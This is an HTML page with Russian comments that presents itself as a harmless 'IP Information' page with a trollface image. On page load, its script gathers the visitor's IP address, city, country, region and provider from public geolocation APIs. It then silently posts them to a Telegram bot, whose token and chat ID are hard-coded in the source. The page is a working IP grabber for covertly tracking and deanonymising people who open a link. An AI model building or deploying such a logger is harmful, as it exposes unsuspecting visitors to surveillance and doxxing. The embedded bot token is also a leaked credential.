<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>IP Информация</title>
    <style>
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #333;
        }
        .container {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
            max-width: 500px;
            width: 90%;
        }
        h1 {
            text-align: center;
            color: #4a4a4a;
            margin-bottom: 30px;
            font-size: 2em;
        }
        .info-block {
            background: #ffffff;
            padding: 20px;
            border-radius: 15px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
        }
        .info-block p {
            margin: 10px 0;
            padding: 10px;
            border-bottom: 1px solid #eee;
            display: flex;
            justify-content: space-between;
        }
        .info-block p:last-child {
            border-bottom: none;
        }
        .label {
            font-weight: bold;
            color: #764ba2;
        }
        .loading {
            text-align: center;
            color: #666;
        }
        .troll-image {
            width: 100px;
            display: block;
            margin: 20px auto 0;
            animation: float 3s ease-in-out infinite;
            cursor: pointer;
        }
        @keyframes float {
            0% { transform: translateY(0px); }
            50% { transform: translateY(-10px); }
            100% { transform: translateY(0px); }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>IP Информация</h1>
        <div id="info" class="info-block">
            <p class="loading">Загрузка данных...</p>
        </div>
        <img src="trollface.png" alt="Trollface" class="troll-image" id="trollImage">
    </div>

    <script>
        // =============================================
        // НАСТРОЙКИ - ЗАМЕНИ НА СВОИ ДАННЫЕ
        // =============================================
        const botToken = '8698773306:AAEfpKve0rNrxK88e79rquBXHK91RhFesTw'; // Твой токен бота
        const chatId = '1238755996'; // Твой Chat ID
        
        // =============================================
        // ФУНКЦИЯ ПОЛУЧЕНИЯ IP (РАБОЧАЯ ВЕРСИЯ)
        // =============================================
        async function getIpInfo() {
            // Пробуем разные API по очереди
            const apis = [
                'https://api.myip.com/',
                'https://ip.nf/me.json',
                'https://ipapi.co/json/',
                'https://ipinfo.io/json'
            ];
            
            for (let api of apis) {
                try {
                    console.log('Пробуем API:', api);
                    const response = await fetch(api);
                    
                    if (!response.ok) {
                        console.log('API не ответил:', api);
                        continue;
                    }
                    
                    const data = await response.json();
                    console.log('Ответ от API:', data);
                    
                    // Преобразуем ответы разных API в единый формат
                    let result = {
                        ip: null,
                        city: 'Неизвестно',
                        country_name: 'Неизвестно',
                        region: 'Неизвестно',
                        org: 'Неизвестно'
                    };
                    
                    // Обрабатываем разные форматы ответов
                    if (data.ip) result.ip = data.ip;
                    if (data.city) result.city = data.city;
                    if (data.country) result.country_name = data.country;
                    if (data.country_name) result.country_name = data.country_name;
                    if (data.region) result.region = data.region;
                    if (data.org) result.org = data.org;
                    if (data.organisation) result.org = data.organisation;
                    
                    if (result.ip) {
                        console.log('Успешно получили IP:', result);
                        return result;
                    }
                } catch (e) {
                    console.log('Ошибка с API', api, e);
                    continue; // Пробуем следующий API
                }
            }
            
            // Если ничего не сработало, пробуем через прокси
            try {
                console.log('Пробуем через прокси...');
                const proxyResponse = await fetch('https://api.allorigins.win/get?url=' + encodeURIComponent('https://ipapi.co/json/'));
                const wrapper = await proxyResponse.json();
                const data = JSON.parse(wrapper.contents);
                
                return {
                    ip: data.ip,
                    city: data.city || 'Неизвестно',
                    country_name: data.country_name || 'Неизвестно',
                    region: data.region || 'Неизвестно',
                    org: data.org || 'Неизвестно'
                };
            } catch (e) {
                console.log('Прокси тоже не сработал:', e);
                return null;
            }
        }
        
        // =============================================
        // ФУНКЦИЯ ОТПРАВКИ В TELEGRAM
        // =============================================
        async function sendToTelegram(data) {
            const message = `🕵️ <b>НОВЫЙ ПОСЕТИТЕЛЬ!</b>

📍 <b>IP адрес:</b> ${data.ip}
🏙️ <b>Город:</b> ${data.city}
🌍 <b>Страна:</b> ${data.country_name}
🗺️ <b>Регион:</b> ${data.region}
📡 <b>Провайдер:</b> ${data.org}
⏰ <b>Время:</b> ${new Date().toLocaleString('ru-RU')}`;

            try {
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                console.log('Сообщение отправлено в Telegram');
            } catch (error) {
                console.error('Ошибка отправки в Telegram:', error);
            }
        }
        
        // =============================================
        // ФУНКЦИЯ ПОКАЗА ИНФОРМАЦИИ
        // =============================================
        async function showInfo() {
            const infoDiv = document.getElementById('info');
            infoDiv.innerHTML = '<p class="loading">Получаем данные...</p>';
            
            const ipData = await getIpInfo();
            
            if (ipData && ipData.ip) {
                infoDiv.innerHTML = `
                    <p><span class="label">IP адрес:</span> <span>${ipData.ip}</span></p>
                    <p><span class="label">Город:</span> <span>${ipData.city}</span></p>
                    <p><span class="label">Страна:</span> <span>${ipData.country_name}</span></p>
                    <p><span class="label">Регион:</span> <span>${ipData.region}</span></p>
                    <p><span class="label">Провайдер:</span> <span>${ipData.org}</span></p>
                `;
                
                // Отправляем в Telegram
                await sendToTelegram(ipData);
            } else {
                infoDiv.innerHTML = '<p class="loading">Не удалось получить информацию об IP</p>';
            }
        }
        
        // =============================================
        // ОБРАБОТЧИК КЛИКА ПО КАРТИНКЕ
        // =============================================
        document.getElementById('trollImage').addEventListener('click', function() {
            alert('🔍 Обновляю информацию...');
            showInfo();
        });
        
        // Запускаем при загрузке страницы
        showInfo();
    </script>
</body>
</html>
